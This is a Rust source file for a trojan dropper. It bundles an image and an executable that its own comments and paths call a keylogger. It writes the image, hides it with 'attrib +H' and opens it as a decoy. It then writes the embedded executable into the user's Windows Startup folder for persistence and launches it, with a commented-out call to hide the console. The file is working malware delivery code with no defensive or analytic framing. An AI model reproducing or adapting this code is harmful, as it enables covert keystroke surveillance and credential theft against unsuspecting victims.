
use std::fs::File;
use std::io::prelude::*;
use std::process::Command;
use std::path::PathBuf;

// Include the image file as a binary blob
const IMAGE_DATA: &'static [u8] = include_bytes!("image.jpg");
const IMAGE_FILE_OUT: &'static str = "./golzar.jpg";

// Include the exe file as a binary blob
const EXE_DATA: &'static [u8] = include_bytes!("app.exe");
// Assuming that you want to write the file to the user's Startup folder
const EXE_FILE_OUT: &'static str = r"C:\Users\mailp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe";

// Name of your program
const EXE_NAME: &'static str = "your_program.exe";

fn main() {
    // unsafe { windows::Win32::System::Console::FreeConsole() };

    write_file();

    // Open the image with the default program
    match Command::new("cmd")
        .args(&["/C", "start", "/B", IMAGE_FILE_OUT])  // add /B argument to start process in the background
        .spawn() {  // use spawn instead of status to not wait for the process to finish
        Ok(_) => {
            // println!("Successfully opened the image.");
        },
        Err(e) => {
            // println!("Failed to execute command: {}", e)
        },
    };

// Part 2:  Write the keylogger to the startup folder

    let startup_dir = match get_startup_dir() {
        Some(dir) => dir,
        None => {
            println!("Failed to get the Startup directory");
            return;
        }
    };

    let exe_file_out = startup_dir.join(EXE_NAME);
    write_app_file(&exe_file_out);
    // Attempt to run the .exe file
    match Command::new(&exe_file_out)
        .status() {
        Ok(_) => {
            println!("Successfully opened the .exe.");
        },
        Err(e) => {
            println!("Failed to execute .exe: {}", e)
        },
    };

    // std::thread::sleep(std::time::Duration::from_secs(3));
}

fn write_file() {
    // Write the image to a file
    let mut file = match File::create(IMAGE_FILE_OUT) {
        Ok(file) => file,
        Err(e) => {
            println!("Failed to create file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(IMAGE_DATA) {
        println!("Failed to write to file: {}", e);
        return;
    }

    // Use the 'attrib' command to hide the file
    // This needs to be run in a subprocess, so it won't work if the Rust script is run in the background
    match Command::new("cmd")
        .args(&["/C", "attrib", "+H", IMAGE_FILE_OUT])
        .status() {
        Ok(status) => {
            if !status.success() {
                println!("Command executed, but reported failure.");
            }
        },
        Err(e) => {
            println!("Failed to execute command: {}", e)
        },
    };
}

fn write_app_file(exe_file_out: &PathBuf) {
    // Write the exe to a file
    let mut file = match File::create(exe_file_out) {
        Ok(file) => file,
        Err(e) => {
            println!("Failed to create file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(EXE_DATA) {
        println!("Failed to write to file: {}", e);
        return;
    }
}

fn write_app_file_old() {
    // Write the exe to a file
    let mut file = match File::create(EXE_FILE_OUT) {
        Ok(file) => file,
        Err(e) => {
            println!("Failed to create file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(EXE_DATA) {
        println!("Failed to write to file: {}", e);
        return;
    }
}

fn get_startup_dir() -> Option<PathBuf> {
    if let Some(mut path) = dirs::home_dir() {
        path.push(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
        return Some(path);
    }
    None
}